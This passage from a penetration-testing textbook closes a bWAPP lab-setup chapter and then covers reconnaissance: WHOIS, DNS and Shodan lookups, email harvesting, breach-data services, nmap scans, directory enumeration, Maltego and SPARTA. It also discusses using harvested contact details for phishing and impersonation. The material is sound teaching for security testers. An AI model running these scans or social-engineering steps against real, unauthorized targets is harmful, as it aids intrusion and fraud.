    ![](images/Figure_2.45.png)

    Figure 2.45: Extract the files to the “htdocs” folder

3.  Start the Apache and MySQL modules in XAMPP by going to the Control Panel and clicking on the Start button next to each of these modules as depicted in [Figure 2.46](#ch02.xhtml_fig2-46):

    ![](images/Figure_2.46.png)

    Figure 2.46: Start the Apache and MySQL

4.  Open a web browser and go to the following URL: [http://localhost/bwapp/install.php](http://localhost/bwapp/install.php). This will launch the BWAPP installation wizard, as depicted in [Figure 2.47](#ch02.xhtml_fig2-47):

    ![](images/Figure_2.47.png)

    Figure 2.47: BWAPP installation wizard

5.  Once the installation is complete, you can access BWAPP by going to [http://localhost/bwapp](http://localhost/bwapp) in your web browser, as depicted in [Figure 2.48](#ch02.xhtml_fig2-48):

    ![](images/Figure_2.48.png)

    Figure 2.48: Installation is complete

6.  Use the default username and password to log in to BWAPP.

| Note: Developed in PHP and making use of a MySQL database, BWAPP can be configured on either a local server such as XAMPP or a remote web server. |

[Conclusion](#contents.xhtml_sc2_80a)

Our VAPT test laboratory setup module has been successfully accomplished. This chapter focused on the hands-on aspects of establishing an attack lab and constructing an authentic testing environment. Armed with this knowledge, you now possess the capability to create your own local lab and comprehend the specific setup prerequisites. This chapter not only imparts a step-by-step understanding of lab setup but also introduces crucial VAPT concepts and tools, including Kali Linux, which aids in running exercises and exploits on targets.

In the forthcoming chapter, we will deeply explore the significance of reconnaissance strategies in effective penetration testing. Gaining adequate information about the target through reconnaissance plays a pivotal role in building essential intelligence for the test. Reconnaissance serves as the initial step in Vulnerability Assessment and Penetration Testing (VAPT), setting the groundwork for the entire process and ensuring its triumphant execution.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 3Active and Passive Reconnaissance Tactics](#contents.xhtml_ch03a)

[Introduction](#contents.xhtml_sc2_81a)

In this chapter, we will dive into the nitty-gritty of reconnaissance tactics, which play a significant role in successful penetration testing. Getting enough information about the target through reconnaissance is key to determining what you need for the test. Different parts of a computer system might need different ways of gathering the right data. As a penetration tester, it is also important to customize your approach based on how the target company works.

The internet is like a treasure trove of info that is out there for everyone. One trick is called Open Source Intelligence (OSINT), which helps a penetration tester collect essential data from public sources like email addresses, domain names, IP addresses, employee names, hostnames, and DNS records.

| Note: Reconnaissance is the first step in a Vulnerability Assessment and Penetration Testing (VAPT) exercise, as it sets the foundation for the rest of the process and helps ensure its success. |

[Structure](#contents.xhtml_sc2_82a)

In this chapter, we will discuss the following topics:

*   What is reconnaissance

*   Why is intelligence gathering so important

*   Types of reconnaissance

*   Passive reconnaissance tools and tactics

    *   WHO IS

    *   DNS reconnaissance

    *   IP reconnaissance

    *   Route mapping

    *   Email address

    *   Name and number

    *   Password or breach data dump

*   Active reconnaissance tools and tactics

    *   Host discovery

    *   Port scanning

    *   Running services and version detection

    *   OS fingerprinting

    *   Directory enumeration

    *   Hard-coded information

*   Additional resources for reconnaissance

    *   Maltego

    *   SPARTA

[What is reconnaissance](#contents.xhtml_sc2_83a)

The process of gathering information about a target in preparation for a Vulnerability Assessment and Penetration Test (VAPT) is known as reconnaissance. This can be done through active and passive methods, including network scanning, social engineering, web scraping, footprinting, and fingerprinting. The purpose of reconnaissance is to obtain as much information as possible about the target, including its systems, servers, networks, applications, and people, in order to identify potential vulnerabilities and plan a more sophisticated attack.

There are many tools, techniques, and websites available for gathering intelligence. This chapter will briefly introduce some of these resources and how they can be used to collect the necessary information. Commonly recommended reconnaissance tactics are illustrated in [Figure 3.1](#ch03.xhtml_fig3-1) below:

![](images/Figure_3.1.png)

Figure 3.1: Reconnaissance tactics

[Why is reconnaissance so important](#contents.xhtml_sc2_84a)

Reconnaissance is crucial to understanding the target before an attack is performed. A well-planned strategy based on reconnaissance can significantly assist a pentester by reducing false positives, decreasing the number of attacks needed, reducing the time required, and improving the quality of the scan. By gathering extensive information about the target, you can plan your attack more efficiently and potentially shorten the time needed to compromise the target.

[Types of reconnaissance](#contents.xhtml_sc2_85a)

A VAPT exercise typically consists of four phases, including reconnaissance, as illustrated in [Figure 3.2](#ch03.xhtml_fig3-2). Reconnaissance can be performed in the following two ways:

![](images/Figure_3.2.png)

Figure 3.2: VAPT exercise phases

[Passive reconnaissance](#contents.xhtml_sc3_86a)

Passive reconnaissance means collecting info about a target without directly engaging it. This way is harder to spot and quicker than active methods, but the data might not be super up-to-date or dependable. For instance, grabbing a list of email addresses from a target group without reaching out to them directly is passive reconnaissance.

[Active reconnaissance](#contents.xhtml_sc3_87a)

Active reconnaissance means you are getting info about a target by directly getting involved with it. This way is riskier and takes more time than passive ways, as you are directly engaging with the target, which could be noticed. It is like a bigger version of passive reconnaissance and usually gives more precise and current info about the target. For instance, if you want a list of services and their versions on a server, you need to ask the server directly. This is an example of active reconnaissance.

| Note: Reconnaissance information can be transformed into actionable intelligence to create a well-planned exploitation plan. This plan includes utilizing chosen methods to attack the system, which will enhance the chances of success and minimize the duration of the operation. |

[Passive reconnaissance tools and tactics](#contents.xhtml_sc2_88a)

There are numerous tactics for conducting passive reconnaissance. Let us discuss some of them in practice:

[WHOIS](#contents.xhtml_sc3_89a)

The first step in reconnaissance is to gather information about the target’s IP address and domain ownership details. The WHOIS command is useful for obtaining this information from a domain registrant database. It can reveal who owns the domain and on which IP address it is hosted.

Depending on the database queried, a pentester can collect a variety of data:

*   Registrar: The organization that issues and manages the reservation of domain names

*   Registrant: The organization or individual who owns the domain

*   Admin and Tech: The organization or individual who develops and maintains the website

*   Nameservers: Domain name to IP address resolution

*   Creation and Expiration date: The domain registration and expiration date

*   Status: The current status of the domain (for example, active, expired, and so on.)

Refer to the screenshots given in [Figure 3.3](#ch03.xhtml_fig3-3) to [Figure 3.5](#ch03.xhtml_fig3-5) for the details of the domain ‘ummedcyber.com’:

Run the following command: whois ummedcyber.com:

![](images/Figure_3.3.png)

Figure 3.3: Domain registrar details

The remaining information is presented in [Figure 3.4](#ch03.xhtml_fig3-4) below in the same order as before.

![](images/Figure_3.4.png)

Figure 3.4: Domain registrant and admin details

The remaining information is presented in [Figure 3.5](#ch03.xhtml_fig3-5) below in the same order as before.

![](images/Figure_3.5.png)

Figure 3.5: Tech admin details and name servers

Based on the above reconnaissance, the following statistics can be derived:

*   If the identified domain is linked to the target organization, the attack surface will increase.

*   Obtaining details about the registrant can be useful for crafting a social engineering attack. For example, if the registrant is an individual, this information can be used to tailor the attack specifically to them.

*   Obtaining contact details for the registrant, such as their email address and phone number, can be useful for social engineering attacks like phishing. A pentester can use this information to reach out to the target and attempt to manipulate them.

*   If we are able to identify the web development company, we can also search for similar vulnerabilities in their other domains.

*   Nameservers can be used to obtain the hosting IP and other details, which can be useful for performing IP-based exploitation.

*   Domain aging refers to the age of the domain, and it can be used to explore old or unused features and functionality of the application by checking the domain’s old archives.

| Note: Sometimes, WHOIS details may be masked with proxy information if the user pays an additional fee to the registrar to keep the ownership details private. |

[DNS reconnaissance](#contents.xhtml_sc3_90a)

Domain Name System (DNS) reconnaissance is a process of collecting various records related to a website that helps in configuring and making it accessible on the internet. One of the key aspects of this technique is DNS resolution, which allows for identifying the IP address linked to the website.

Furthermore, by utilizing DNS reconnaissance, a penetration tester can gather valuable intelligence such as:

*   NS (Name Server) Record: These indicate the location of the servers responsible for managing and storing the DNS records for a particular domain.

*   A (Address) Records: These records specify the IP address associated with a given domain

*   AAAA Record: These records are quite similar to ‘A’ records, but they are used to map a domain name to an IPv6 address

*   MX (Mail Exchange) Records: These records indicate the details of the email servers associated with the domain.

*   CNAME (Canonical Name) Record: These records assist in determining the names of other domains if multiple services are running on a single server.

*   TXT Records: These records contain details about other resources associated with the domain, such as servers and network information.

*   PTR (Pointer) Records: These records are the inverse of ‘A’ records, and they provide the domain name corresponding to an IP address.

There are various tools available for conducting DNS reconnaissance, such as nslookup, dig, dnsenum, dnsrecon, dnsmap, DNSRecon, theHarvester, and Sublist3r. To illustrate the concept of DNS reconnaissance, we will use the example of DNSenum, which is a multithreaded Perl script that can be run in command line mode to enumerate DNS information.

See the screenshots given in [Figure 3.6](#ch03.xhtml_fig3-6) and [Figure 3.7](#ch03.xhtml_fig3-7) for an in-depth look at the DNS reconnaissance of the domain ‘ummedcyber.com’.

Run the following command: dnsenum ummedcyber.com

![](images/Figure_3.6.png)

Figure 3.6: DNS reconnaissance

The remaining information is presented in [Figure 3.7](#ch03.xhtml_fig3-7) below in the same order as before:

![](images/Figure_3.7.png)

Figure 3.7: Domain records

Let us take another example of a GUI-based DNS reconnaissance tool, DNSdumpster.com. It is a free tool that can be used to discover hosts associated with a domain. To use the tool, simply enter the domain name as shown in [Figure 3.8](#ch03.xhtml_fig3-8) below:

![](images/Figure_3.8.png)

Figure 3.8: GUI-based DNS reconnaissance tool, [dnsdumpster.com](https://dnsdumpster.com)

Please refer to [Figure 3.9](#ch03.xhtml_fig3-9) and [Figure 3.10](#ch03.xhtml_fig3-10) for the output of the DNS dumpster tool, as shown below:

![](images/Figure_3.9.png)

Figure 3.9: DNS reconnaissance

The remaining information is presented in [Figure 3.10](#ch03.xhtml_fig3-10) below in the same order as before:

![](images/Figure_3.10.png)

Figure 3.10: Graphical representation of domain records

Based on the above reconnaissance, the following statistics can be derived:

*   Knowing the IP address of a target, it becomes possible to determine the geographic location of the web hosting, thereby enhancing the attack surface.

*   Performing a reverse lookup can assist a penetration tester in identifying other domains hosted on the same shared server or IP range.

*   MX records can provide details about email servers, which can aid in identifying potential targets for phishing and other crafted attacks.

*   CNAME records can be used to obtain a list of associated subdomains, technologies, and other services used by a domain.

[IP reconnaissance](#contents.xhtml_sc3_91a)

IP reconnaissance refers to the process of gathering information about an IP address, such as the number of open ports and the services that are running. As this is a form of passive reconnaissance, it is important to obtain this information from passive sources, such as Shodan, rather than sending direct requests to the target.

During IP reconnaissance, a penetration tester can gather a wide range of information such as:

*   Open ports: It provides a list of open ports on a targeted IP address.

*   Running services: Many large databases passively store information about the services running on various IP addresses.

*   Reverse lookup: IP reconnaissance is used to identify the associated domain or determine the IP range.

There are many tools available on the internet for reverse lookup, but we will use the freeware website [www.viewdns.info](http://www.viewdns.info/) as shown in [Figure 3.11](#ch03.xhtml_fig3-11) and [Figure 3.12](#ch03.xhtml_fig3-12). In addition to IP reverse lookup, the website offers multiple search options that can aid in comprehensive reconnaissance on a single platform:

![](images/Figure_3.11.png)

Figure 3.11: Search IP for reverse lookup

[Figure 3.12](#ch03.xhtml_fig3-12) below showcases the results of a Reverse IP lookup search:

![](images/Figure_3.12.png)

Figure 3.12: Reverse IP lookup response

To gain a practical understanding of this IP reconnaissance approach, let us examine the capabilities and operating process of the shodan.io platform.

[Shodan](#contents.xhtml_sc4_92a)

Shodan.io is a web search tool where you can look up different internet servers using different filters. It looks around the internet for devices anyone can access and focuses mostly on web servers. You have to make an account to use Shodan. To get good at using Shodan, do this:

1.  Access the shodan.io website and click on explore, as illustrated in the following [Figure 3.13](#ch03.xhtml_fig3-13):

    ![](images/Figure_3.13.png)

    Figure 3.13: Open shodan.io and click on ‘explore’

2.  You can then explore any target area, as shown in the previous figure, to view the total number of available hosts and a list of hosts grouped by the top countries and organizations globally. Refer to [Figure 3.14](#ch03.xhtml_fig3-14) for an example:

    ![](images/Figure_3.14.png)

    Figure 3.14: List of hosts grouped by the top countries and organizations globally

3.  To view detailed information, select a specific host on Shodan. You will be able to see a list of open ports and the associated services. As an example, the following [Figure 3.15](#ch03.xhtml_fig3-15) illustrates the details of an IP-based camera host:

    ![](images/Figure_3.15.png)

    Figure 3.15: List of open ports and the associated services

4.  To improve the results, there are various filters available on Shodan that can be used in search queries. For example, if you want to find hosts located in India with a specific port open, you can construct the search query as shown in [Figure 3.16](#ch03.xhtml_fig3-16):

    ![](images/Figure_3.16.png)

    Figure 3.16: advanced search filter ‘country:”IN” port:”445”’

Based on the above reconnaissance, the following statistics can be derived:

*   Having knowledge about the open ports and running services on a target system will enhance the planning and execution of an exploitation attempt.

*   Obtaining a list of other associated IP addresses will expand the attack surface, increasing the likelihood of successfully compromising the target.

| Note: Additionally, Shodan can be employed to detect Internet-connected industrial control systems (ICS), such as SCADA systems, which may be susceptible to cyberattacks. |

[Route mapping](#contents.xhtml_sc3_93a)

Route mapping involves figuring out the way and devices that network traffic takes to get where it is going. This helps fix network problems, and also helps testers find weak points and possible security problems in a network.

There are various methods that can be used to perform route mapping, including:

*   Traceroute: The traceroute command traces the route of an IP packet to an Internet host by sending UDP probe packets with a small maximum time-to-live, and listening for ICMP TIME_EXCEEDED responses from gateways along the way.

*   Ping: A ping is a simple tool used in network administration to check if a specific IP address is reachable and can receive requests. It is also known as Packet Internet or Inter-Network Groper.

*   Pathping: The PathPing command is a command-line tool available in Windows 2000 and later versions, which combines the features of both ping and tracert. It allows you to ping each node in a single command and also monitor the behavior of nodes over a longer period of time, compared to the standard four pings of ping or a single route of traceroute.

*   MTR: My Traceroute (MTR) is a powerful network diagnostic tool that combines the functionality of traceroute and ping to test connectivity and speed. It can be used to poll remote servers and measure latency changes over time, making it an invaluable tool for troubleshooting network issues.

Let us use the traceroute tool on a Windows machine to identify the route and devices through which network traffic is directed to reach its destination. Run the command as shown in [Figure 3.17](#ch03.xhtml_fig3-17):

Run the following command: tracert ummedcyber.com

![](images/Figure_3.17.png)

Figure 3.17: Route mapping (traceroute)

Based on the above reconnaissance, the following statistics can be derived:

*   Route mapping enables you to visualize the target network, making it simpler to comprehend and plan attacks effectively.

*   Route mapping allows you to identify bottlenecks in the targeted network, such as areas where congestion is taking place.

*   Route mapping can assist you in determining if your network is in compliance with industry requirements, by identifying any missing compliance.

*   Route mapping can also aid in determining the existence of hosts on the network.

[Email address](#contents.xhtml_sc3_94a)

In social engineering attacks, email addresses are often a key tool. If a tester cannot get into a target directly or is in a red team activity, emails can create a link between the user and the tester. Mistakes by people can sometimes let testers in even more than technical tricks.

There are several open-source tools available for this purpose, but in this example, we will use the EmailHarvester package on Kali Linux. EmailHarvester is a tool that can be used to obtain email addresses associated with a specific domain from search engines, as demonstrated in [Figure 3.18](#ch03.xhtml_fig3-18):

Run the following command:

theHarvester –d <domainname> -l <data harvest limit> -b <source search engine>

![](images/Figure_3.18.png)

Figure 3.18: Email address harvesting

Another tool for discovering and verifying email addresses is Maltego, which we will cover in-depth in the final section of this chapter.

Based on the above reconnaissance, the following statistics can be derived:

*   A pentester can use an email address to conduct social engineering attacks and gather additional information about the targeted organization.

*   A pentester can launch a phishing attack on a targeted user to obtain critical login credentials.

*   A pentester can use an email address to impersonate a user and deceive others into transferring money or sensitive information.

*   A pentester can also send spam emails as part of a strategy to keep the targeted user occupied during the exploitation.

[Name and number](#contents.xhtml_sc3_95a)

By identifying the name and phone number of an employee, a pentester can plan and execute social engineering attacks such as vishing, smishing, and pretexting. Specifically, once the attacker has the name of the person, they can search for the individual on social media to confirm their employment with the targeted organization. Upon confirmation, the pentester can then develop and implement a social engineering strategy to either directly compromise the organization’s digital infrastructure or manipulate the employee into disclosing sensitive information.

To understand the information gathering based on individuals’ names and numbers, we will discuss Maltego in the last section of this chapter. In the final section of this chapter, we will delve into the topic of gathering information based on an individual’s name and number using the tool called Maltego.

| Note: Social engineering is a method employed by attackers to deceive and manipulate individuals into revealing sensitive information or executing actions that can be detrimental to them or their organization. |

[Password or breach data dump](#contents.xhtml_sc3_96a)

A password or breach data dump has login details and sensitive info exposed in a data breach. Hackers put this on dark web markets, easily reached by cybercriminals. Bad passwords and reusing them on different sites can make security weak, letting testers get into online accounts, even social media or virtual meetings. But using this info without permission or ethics might be wrong or illegal. So, getting permission and acting ethically are really important in VAPT.

Numerous tools and services are available for data breach and password security:

*   Dehashed: Dehashed is a paid online platform for password security and data breach prevention that provides search results for any breaches and associated breached passwords.

*   Have I Been Pwned: Have I Been Pwned is a website for users to search data breaches involving their email, username, or domain, and check password breach status.

*   Password Checkup: Password Checkup is a Chrome extension that automatically checks saved passwords against a database of known breaches to detect exposure.

*   SpyCloud: SpyCloud is an online platform that offers password security services including tools for verifying data breach involvement and analyzing password breaches.

[Active reconnaissance tools and tactics](#contents.xhtml_sc2_97a)

There are numerous tactics for conducting active reconnaissance. Let us discuss some of them in practice:

[Host discovery](#contents.xhtml_sc3_98a)

Host discovery is the initial step in network reconnaissance and is used to identify the potential targets for an attack. It involves identifying live hosts within a targeted network. The traditional method of host discovery is using ICMP echo to check host status, however, this is frequently blocked by network security measures. Despite this, host discovery tools still have options and built-in scripts to check host status.

In this example, we will use Nmap for host discovery. Nmap, short for “Network Mapper,” is a free and open-source tool used for network discovery and security auditing. While Nmap is typically used in the command-line interface, it is also available in a graphical user interface called Zenmap. Let us perform a ping scan to identify the hosts on the network, as depicted in [Figure 3.19](#ch03.xhtml_fig3-19):

Run the following command: nmap –v –sP 192.168.159.129

Here, the ‘-v’ flag is used for verbose output, providing detailed and organized information from the nmap scan. The ‘-sP’ flag is used for a ping scan. Please refer to the following figure:

![](images/Figure_3.19.png)

Figure 3.19: Host discovery scan

Let us delve into some of the key practical applications of Nmap as outlined in [Table 3.1](#ch03.xhtml_tab3-1) below:

| S No | Discovery Technique | Associated Flag |
| 01 | List Scan | -sL |
| 02 | No Port Scan (ping sweep) | -sn |
| 03 | No Ping Scan | -Pn |
| 04 | TCP SYN Ping | -PS |
| 05 | TCP ACK Ping | -PA |
| 06 | UDP Ping | -PU |
| 07 | SCTP INIT Ping | -PY |
| 08 | ICMP Ping Types | -PE or –PP or -PM |
| 09 | IP Protocol Ping | -PO |
| 10 | No ARP or ND Ping | --disable-arp-ping |

Table 3.1: Host discovery techniques and associated flags

*   List scan: The list scan is a basic method of identifying hosts on a specified network(s) that only involves listing the hosts without sending any packets to them. By default, Nmap also performs reverse-DNS resolution on the hosts to determine their names.

*   No port scan: The No port scan option tells Nmap to only identify the hosts that are available on the specified network(s) without conducting a port scan afterward.

*   No ping scan: When you run No ping scan, it disables the host discovery process, and Nmap will try to perform the specified scan on all the target IP addresses given, regardless of whether the hosts are online or not. This option eliminates the need for the host discovery stage entirely.

*   TCP SYN ping: When the TCP SYN packet is sent to the target host on a specific port, and if the host responds with an SYN-ACK packet, it indicates that the host is active and available on the network.

*   TCP ACK ping: When the TCP ACK packet is sent to the target host on a specific port, and if the host responds with an RST packet, it indicates that the host is active and available on the network.

*   UDP ping: When the User Datagram Protocol (UDP) packet is sent to the target host on a specific port, and if the host responds with ICMP Destination Unreachable packet, it indicates that the host is active and available on the network.

*   SCTP INIT ping: When the Stream Control Transmission Protocol (SCTP) INIT packet is sent to the target host on a specific port, and if the host responds with an SCTP INIT-ACK packet, it indicates that the host is active and available on the network.

*   ICMP ping types: When the Internet Control Message Protocol (ICMP) echo request is sent to the target host on a specific port, and if the host responds with an ICMP echo reply, it indicates that the host is active and available on the network.

*   IP protocol ping: When the IP packet with a specific protocol number set in the IP header is sent to the target host, and if the host responds with ICMP protocol unreachable packet, it indicates that the host is active and available on the network.

*   No ARP or ND ping: Address Resolution Protocol (ARP) is used to determine the Media Access Control (MAC) address associated with an Internet Protocol (IP) address on a local network, while Neighbor Discovery (ND) is the equivalent protocol used for IPv6 networks. When the ARP or ND request is sent to the target host, and if the host responds with an ARP or ND reply, it indicates that the host is active and available on the network.

| Note: The Ping Sweep and Ping Scan techniques both use ICMP echo request packets to check the availability of hosts, but they have different specific applications. The Ping Sweep method is used to find all active hosts within a defined range of IP addresses, while the Ping Scan technique is used to determine the accessibility of a particular host. |

[Port scanning](#contents.xhtml_sc3_99a)

Once we have identified live hosts on the network, the next step is to determine which ports on those hosts are open and accepting incoming connections. This is done through the process of port scanning, which involves sending packets to a host on various ports to determine which ports are open, closed, or filtered.

Nmap recognizes six different states for ports:

*   Open: The host is actively accepting incoming connections, data packets, or associations on this port using the TCP, UDP, or SCTP protocol.

*   Closed: The targeted host is active and online, but it is not accepting incoming connections, data packets, or associations on that specific port.

*   Filtered: Nmap is unable to determine whether the port is open or not because the probes sent to reach the port are blocked by packet filtering which could be from a dedicated firewall device, static routing rules, or host-based firewall software.

*   Unfiltered: In this state, the port is reachable, but Nmap cannot determine if it is open or closed.

*   Open|Filtered: Nmap is unable to determine the status of a port, whether it is open or filtered, and categorizes it as “open|filtered”.

*   Closed|Filtered: Nmap is unable to determine the status of a port, whether it is closed or filtered, and categorizes it as “close|filtered”.

[Port scanning techniques](#contents.xhtml_sc4_100a)

Port scanning techniques are used to identify the open ports on a host that are ready to accept incoming connections. Nmap offers a variety of techniques for identifying open ports on a host. For a demonstration of using nmap for port scanning, refer to [Figure 3.20](#ch03.xhtml_fig3-20).

Run the following command: nmap –v –p 22 192.168.159.129

Here, the ‘-p’ flag is used to specify the port number or range we want to scan:

![](images/Figure_3.20.png)

Figure 3.20: Port scanning using nmap

Let us explore some of the port scanning methods here, as detailed in [Table 3.2](#ch03.xhtml_tab3-2) below:

| S No | Port Scanning Techniques | Associated Flag |
| 01 | TCP Scan | -sT |
| 02 | UDP Scan | -sU |
| 03 | Stealth Scan (Half Open Scan) | -sS |
| 04 | FIN Scan | -sF |
| 05 | Null Scan | -sN |
| 06 | Xmas Scan | -sX |

Table 3.2: NMAP port scanning techniques

*   TCP scan: TCP scan is a method of determining if a port is open or not on a target host by sending TCP packets to various ports on the host. One example of a TCP scan is a TCP Connect scan, which establishes a full TCP connection to the target port. This method is considered to be the most reliable and accurate, but also the most detectable.

*   UDP scan: UDP scan is a method of determining if a port is open or not on a target host by sending UDP packets to various ports on the host.

*   Stealth scan (Half open scan): A half-open scan, also known as an SYN scan, sends an SYN packet to the target port, if the target port is open, the host will respond with an SYN-ACK packet. If the port is closed, the host will respond with an RST packet.

*   FIN scan: The scan sends a FIN packet to the target port and waits for a response. If the port is open on the remote host, it will respond with an RST (reset) packet, showing that the port is closed. If the port is closed, no response will be received from the remote host, indicating that the port is open.

*   Null scan: This technique involves sending packets without any flags set in the TCP header, known as a null packet. If a port is open on the remote host, no response will be sent back. If the port is closed, the remote host will issue an RST (reset) packet as a response.

*   Xmas scan: This technique involves sending packets with the FIN, PSH, and URG flags set in the TCP header, known as a Xmas packet. If the port is open on the remote host, it will respond with an RST (reset) packet, indicating the port is closed. If the port is closed, the remote host will not respond, indicating the port is open.

| Note: A half-open scan does not fully establish a connection with the remote host, unlike a full-open scan, and leaves the connection in an incomplete state. Half-open scans are less detectable by firewalls and intrusion detection systems as they do not create a full connection. |

[Running services and version detection](#contents.xhtml_sc3_101a)

Once the open ports on a targeted host have been identified, the next step is to identify the service and version that are running on each port. Nmap can do this by sending a series of probes to the target host and analyzing the responses. By examining the responses’ banners, application version number, or other identifying characteristics, Nmap can determine the service and version that are running on each port. This service and version detection can be useful for identifying specific software versions that may have known vulnerabilities or misconfigurations that a penetration tester could exploit.

To determine the service name and version, the ‘-sV’ flag can be used in the Nmap command, as shown in the example illustrated in [Figure 3.21](#ch03.xhtml_fig3-21):

Run the following command: nmap –v –p 22 –sV 192.168.159.129

![](images/Figure_3.21.png)

Figure 3.21: Running services and version detection using nmap

[OS fingerprinting](#contents.xhtml_sc3_102a)

Operating System (OS) fingerprinting is the process of identifying the operating system on a targeted host by analyzing the responses to various packets sent to it. Nmap is a commonly used tool for this, which compares the response to its database of known OS fingerprints and outputs the OS details if a match is found. This information can be useful for finding OS-specific vulnerabilities and determining the limitations of certain services. Additionally, it can also be used to validate the results of automated vulnerability scanners by determining the specific OS and its version.

To determine the OS of a target host, the ‘-O’ option can be used in the Nmap command. Furthermore, the ‘-A’ option can be used to enable OS detection, as illustrated in the example provided in [Figure 3.22](#ch03.xhtml_fig3-22):

Run the following command: nmap –O 192.168.159.129

![](images/Figure_3.22.png)

Figure 3.22: OS detection using nmap

[Directory enumeration](#contents.xhtml_sc3_103a)

Web directory enumeration is a technique utilized in the reconnaissance phase of a web application penetration test. It involves using tools and methods, such as automated scripts and manual browsing, to identify and list all directories and pages present on the target application. There are various enumeration tools available, such as DirBuster, Dirb, and Nikto, that come in both GUI and command line versions. These tools use a pre-defined list of possible directory names and send requests to the target application. The responses from the application are then analyzed and directories that return expected responses are marked as existing.

The directory and page reconnaissance technique may uncover the following valuable information:

*   The results of this technique may reveal confidential and hidden directories that were left on the server by mistake.

*   Old backups and archives may also be discovered.

*   Additionally, login credentials may be found in plain text files.

*   If authorization is not implemented properly, force browsing may be possible.

*   Details about the development framework and language may also be disclosed, allowing attackers to easily exploit associated vulnerabilities.

*   The discovery of secret login panels can also expand the attack surface.

For a hands-on illustration of directory enumeration, we can examine the execution of the Dirb tool as presented in [Figure 3.23](#ch03.xhtml_fig3-23):

Run the following command: dirb http://192.168.159.129/mutillidae

![](images/Figure_3.23.png)

Figure 3.23: Directory enumeration

[Hard-coded information](#contents.xhtml_sc3_104a)

While the primary focus during penetration testing should be on core reconnaissance tactics, it is also important to review the source code on both the client and server sides. This can reveal critical information to an attacker. Source code analysis can be conducted using various open-source tools, such as web debuggers and browser extensions, to identify weaknesses in the coding and associated vulnerabilities. Additionally, there are also premium tools available for automated source code review. The ultimate goal of this exercise is to identify vulnerabilities and advise the application owner against hard-coding confidential information in the client-side code.

During source code review, a pentester can uncover the following information:

*   A pentester may be able to extract passwords, API keys, static tokens, and other confidential data that have been hard-coded into a client-side application or website.

*   This information can be used to gain unauthorized access to associated resources.

*   Additionally, a pentester can use this initial level of access to perform advanced attacks for privilege escalation.

| Note: When hard-coded information, like personally identifiable information (PII) or sensitive data, is not properly protected, it can be exposed. This can result in non-compliance with regulations like GDPR or HIPAA and result in penalties or fines. |

[Additional resources for reconnaissance](#contents.xhtml_sc2_105a)

In addition to the reconnaissance tactics discussed, there are also various miscellaneous techniques that can be used as needed. These techniques can be highly effective in gathering information about the target. Let us discuss a few tools and their practical usage.

[Maltego](#contents.xhtml_sc3_106a)

Maltego, crafted by Paterva in Pretoria, South Africa, is a potent tool for finding info and doing detective work. It is awesome at gathering data from open sources and showing it in a graph. With links to places like WHOIS, Shodan, The Wayback Machine, ATT&CK, Pipl, VirusTotal, and more, it opens up loads of data. It also has many special tools (transforms) to dig deeper.

We will use the free Community Edition of Maltego for this demo. Just sign up on their website. Maltego has a few main parts: a navigation bar at the top, a main work area, and a collection of tools and bits on the right. After you install it, it will look like the picture in [Figure 3.24](#ch03.xhtml_fig3-24) below:

![](images/Figure_3.24.png)

Figure 3.24: Maltego (Community Edition) user interface

Maltego can be used to uncover a wide range of intelligence, but in this discussion, we will only cover a few of the most common use cases.

| Note: To ensure proper organization and management of data, it is recommended to create a new case from the navigation bar. This will help to keep data segregated and make it easy to access previous case data and correlate old events for improved and more reliable intelligence. |

*   IP Address: To gather information about a specific IP address, select the ‘IPv4 Address’ entity from the palette and drop it onto the graph window. Enter the host address, and then select the appropriate transforms to run by right-clicking on the palette. You can choose to run all transforms or select specific ones based on your investigation needs. The collected data will be visualized as shown in [Figure 3.25](#ch03.xhtml_fig3-25) below:

    ![](images/Figure_3.25.png)

    Figure 3.25: Gather information about a specific IP address

*   Person: To gather information about a specific person, select the ‘Person’ entity from the palette and drop it onto the graph window. Enter the person’s name, and then select the appropriate transforms to run by right-clicking on the palette. You can choose to run all transforms or select specific ones based on your investigation needs. The collected data will be visualized as shown in [Figure 3.26](#ch03.xhtml_fig3-26) below:

    ![](images/Figure_3.26.png)

    Figure 3.26: Gather information about a specific person

*   Phone number: To gather information about a phone number, select the ‘Phone Number’ entity from the palette and drop it onto the graph window. Enter the phone number, and then select the appropriate transforms to run by right-clicking on the palette. You can choose to run all transforms or select specific ones based on your investigation needs. The collected data will be visualized as shown in [Figure 3.27](#ch03.xhtml_fig3-27) below:

    ![](images/Figure_3.27.png)

    Figure 3.27: Gather information about a specific phone number

[SPARTA](#contents.xhtml_sc3_107a)

SPARTAis a powerful Python-based GUI tool designed for automated enumeration and vulnerability assessment, web crawling and brute force attacks. It streamlines the testing process by providing quick and integrated scanning capabilities, and presents the results in an easy-to-understand format, saving testers valuable time and effort.

To install Sparta, execute the following commands in your terminal as shown in [Figure 3.28](#ch03.xhtml_fig3-28):

cd /usr/share/

git clone https://github.com/secforce/sparta.git

![](images/Figure_3.28.png)

Figure 3.28: Install SPARTA on Kali Linux

Once the cloning is complete, navigate to the ‘sparta’ folder and make it executable using the appropriate command for your system. To launch the application, simply type ‘sparta’ in any terminal. To gain an understanding of the user interface of SPARTA, refer to [Figure 3.29](#ch03.xhtml_fig3-29):

![](images/Figure_3.29.png)

Figure 3.29: The user interface of SPARTA

To begin the enumeration process, go to the Hosts section and add a new host. Once you have added the host, click on the Add to scope button from the pop-up window. The enumeration process will automatically start. For assistance in adding a host, refer to [Figure 3.30](#ch03.xhtml_fig3-30):

![](images/Figure_3.30.png)

Figure 3.30: Add a new host to the SPARTA

You can monitor the scanning process live by checking the log section at the bottom of the interface. The results of the scan will be displayed as shown in [Figure 3.31](#ch03.xhtml_fig3-31):

![](images/Figure_3.31.png)

Figure 3.31: SPARTA output

| Note: To enhance its capabilities and effectiveness, consider integrating SPARTA with other tools and resources, such as importing Nmap output and utilizing Nmap’s NSE scripts for more in-depth reconnaissance and vulnerability scanning, as well as integrating it with a vulnerability database like the National Vulnerability Database (NVD) for automatic checks of known vulnerabilities and more accurate and comprehensive results. |

[Conclusion](#contents.xhtml_sc2_108a)

This chapter has equipped you with a solid understanding of reconnaissance methods, a key component for effective Vulnerability Assessment and Penetration Testing (VAPT). As you conclude this chapter, you will be well-prepared to initiate vulnerability assessment, armed with a thorough grasp of the target gathered through reconnaissance. Not only that, you will have gained expertise in both theoretical and practical reconnaissance aspects. This chapter encapsulates the findings from the reconnaissance phase, formulating actionable insights, and creating a robust VAPT strategy.

